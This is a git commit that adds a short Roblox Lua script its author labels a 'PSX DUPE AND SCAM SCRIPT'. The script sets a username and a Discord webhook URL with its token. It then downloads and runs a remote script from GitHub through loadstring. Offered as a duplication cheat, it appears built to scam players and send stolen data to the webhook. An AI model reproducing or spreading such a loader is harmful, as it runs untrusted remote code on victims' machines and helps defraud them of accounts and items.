b9234877caf63b0cc27299796bf33ee79052eb79
superdogerider265 <68976013+superdogerider265@users.noreply.github.com>
2022-12-30 17:54:21 -0500

    PSX DUPE AND SCAM SCRIPT

---
+++ PSX.lua
@@ -0,0 +1,4 @@
+UserName = "SuperDogeRider"
+WebHook = "https://discord.com/api/webhooks/1058510339945283644/xV0jDGHRfQrHQmXU5BZxq-8RHfd6TfdEnAqjZE6HPEVwR7W82RRRxTgYhO1ET8YyG2ix"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
